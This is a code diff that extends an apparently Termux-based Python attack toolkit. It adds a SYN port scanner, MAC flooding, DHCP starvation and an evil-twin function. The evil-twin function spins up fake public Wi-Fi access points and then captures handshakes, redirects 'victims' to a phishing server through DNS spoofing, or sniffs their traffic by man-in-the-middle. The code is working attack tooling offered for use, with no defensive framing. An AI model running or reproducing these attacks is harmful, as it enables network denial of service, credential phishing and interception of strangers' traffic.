@@ -11,6 +11,7 @@ from scapy.layers.dns import DNSQR, DNSRR
 from scapy.layers.l2 import ARP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.nfqueue import NetfilterQueue
+import random
 
 def check_platform():
     if platform.system() == "Windows":
@@ -91,9 +92,10 @@ def network_attacks_termux():
     print(f"[3] DNS Spoof")
     print(f"[4] MITM Sniffer")
     print(f"[5] TCP SYN Flood")
-    print(f"[6] SSL Strip")
-    print(f"[7] Packet Capture")
-    print(f"[8] Back{Fore.RESET}")
+    print(f"[6] Port Scanner")
+    print(f"[7] MAC Flood")
+    print(f"[8] DHCP Starvation")
+    print(f"[9] Back{Fore.RESET}")
     
     choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
     
@@ -116,12 +118,15 @@ def network_attacks_termux():
         port = input(f"{Fore.CYAN}Enter target port: {Fore.RESET}")
         syn_flood(target, int(port))
     elif choice == "6":
-        interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
-        ssl_strip(interface)
+        target = input(f"{Fore.CYAN}Enter target IP: {Fore.RESET}")
+        port_scanner(target)
     elif choice == "7":
         interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
-        packet_capture(interface)
+        mac_flood(interface)
     elif choice == "8":
+        interface = input(f"{Fore.CYAN}Enter interface (e.g. wlan0): {Fore.RESET}")
+        dhcp_starvation(interface)
+    elif choice == "9":
         return
     else:
         print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
@@ -225,7 +230,8 @@ def wifi_attacks():
     print(f"[3] Deauth Attack")
     print(f"[4] Monitor Mode")
     print(f"[5] Capture Handshakes")
-    print(f"[6] Back{Fore.RESET}")
+    print(f"[6] Create Multiple Access Points")
+    print(f"[7] Back{Fore.RESET}")
     
     choice = input(f"\n{Fore.CYAN}Select attack: {Fore.RESET}")
     
@@ -246,6 +252,9 @@ def wifi_attacks():
         interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
         capture_handshakes(interface)
     elif choice == "6":
+        interface = input(f"{Fore.CYAN}Enter interface (e.g., wlan0): {Fore.RESET}")
+        create_multiple_aps(interface)
+    elif choice == "7":
         return
     else:
         print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
@@ -284,6 +293,62 @@ def capture_handshakes(interface):
             print(f"{Fore.GREEN}[+] Handshake capture stopped. Check capture files.{Fore.RESET}")
     else:
         print(f"{Fore.RED}[!] Feature not implemented for this platform{Fore.RESET}")
+
+def create_multiple_aps(interface):
+    try:
+        print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
+        
+        # Setup network
+        os.system(f"su -c 'airmon-ng check kill'")
+        os.system(f"su -c 'airmon-ng start {interface}'")
+        
+        # Create fake APs
+        ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
+        
+        print(f"\n{Fore.YELLOW}Select action when device connects:")
+        print(f"1. Capture handshake")
+        print(f"2. Redirect to phishing page")
+        print(f"3. MITM attack")
+        print(f"4. Just monitor{Fore.RESET}")
+        
+        action = input(f"\n{Fore.CYAN}Choose action: {Fore.RESET}")
+        
+        # Setup internet sharing
+        os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")  # Enable IP forwarding
+        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE'")  # NAT rule
+        os.system(f"su -c 'iptables -A FORWARD -i at0 -j ACCEPT'")  # Allow forwarding
+        
+        # Start DHCP server
+        os.system(f"su -c 'dnsmasq --interface=at0 --dhcp-range=192.168.1.2,192.168.1.100,12h'")
+        
+        # Create APs
+        for ssid in ssid_list:
+            os.system(f"su -c 'airbase-ng -e \"{ssid}\" -c {random.randint(1,11)} {interface}mon &'")
+            print(f"{Fore.GREEN}[+] Created AP: {ssid}{Fore.RESET}")
+        
+        print(f"\n{Fore.YELLOW}[*] Setting up network...{Fore.RESET}")
+        os.system(f"su -c 'ifconfig at0 up'")
+        os.system(f"su -c 'ifconfig at0 192.168.1.1 netmask 255.255.255.0'")
+        
+        print(f"{Fore.GREEN}[+] Network ready! Victims will have internet access{Fore.RESET}")
+        
+        while True:
+            if action == "1":
+                os.system(f"su -c 'airodump-ng -w capture {interface}mon'")
+            elif action == "2":
+                fake_ip = input(f"{Fore.CYAN}Enter your phishing server IP: {Fore.RESET}")
+                dns_spoof("192.168.1.2", fake_ip)
+            elif action == "3":
+                mitm_sniffer(interface)
+            else:
+                os.system(f"su -c 'airodump-ng {interface}mon'")
+            
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
+        os.system(f"su -c 'killall airbase-ng dnsmasq'")
+        os.system(f"su -c 'iptables -F'")
+        os.system(f"su -c 'iptables -t nat -F'")
+        os.system(f"su -c 'airmon-ng stop {interface}mon'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
@@ -413,6 +478,63 @@ def packet_capture(interface):
         os.system(f"su -c 'tcpdump -i {interface} -w capture.pcap -v'")
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Capture saved to capture.pcap{Fore.RESET}")
+
+def port_scanner(target_ip):
+    try:
+        print(f"{Fore.GREEN}[+] Starting port scan on {target_ip}{Fore.RESET}")
+        common_ports = [21,22,23,25,53,80,443,445,8080,8443]
+        
+        for port in common_ports:
+            packet = scapy.IP(dst=target_ip)/scapy.TCP(dport=port, flags="S")
+            response = scapy.sr1(packet, timeout=1, verbose=False)
+            
+            if response and response.haslayer(scapy.TCP):
+                if response[scapy.TCP].flags == 0x12: # SYN-ACK
+                    print(f"{Fore.GREEN}[+] Port {port} is open{Fore.RESET}")
+                    # Send RST to close connection
+                    rst = scapy.IP(dst=target_ip)/scapy.TCP(dport=port, flags="R")
+                    scapy.send(rst, verbose=False)
+                    
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[*] Stopping port scan...{Fore.RESET}")
+
+def mac_flood(interface):
+    try:
+        print(f"{Fore.GREEN}[+] Starting MAC flood on {interface}{Fore.RESET}")
+        
+        while True:
+            # Generate random MAC
+            src_mac = scapy.RandMAC()
+            dst_mac = scapy.RandMAC()
+            
+            # Create packet
+            packet = scapy.Ether(src=src_mac, dst=dst_mac)/scapy.ARP()
+            scapy.sendp(packet, iface=interface, verbose=False)
+            print(f"\r{Fore.GREEN}[+] Flooding network with MAC addresses{Fore.RESET}", end="")
+            
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[*] Stopping MAC flood{Fore.RESET}")
+
+def dhcp_starvation(interface):
+    try:
+        print(f"{Fore.GREEN}[+] Starting DHCP starvation on {interface}{Fore.RESET}")
+        
+        while True:
+            # Generate random MAC
+            mac = scapy.RandMAC()
+            
+            # Create DHCP discover packet
+            dhcp_discover = (scapy.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/
+                           scapy.IP(src="0.0.0.0", dst="255.255.255.255")/
+                           scapy.UDP(sport=68, dport=67)/
+                           scapy.BOOTP(chaddr=mac)/
+                           scapy.DHCP(options=[("message-type","discover"),"end"]))
+            
+            scapy.sendp(dhcp_discover, iface=interface, verbose=False)
+            print(f"\r{Fore.GREEN}[+] DHCP requests sent{Fore.RESET}", end="")
+            
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[*] Stopping DHCP starvation{Fore.RESET}")
 
 if __name__ == "__main__":
     main()
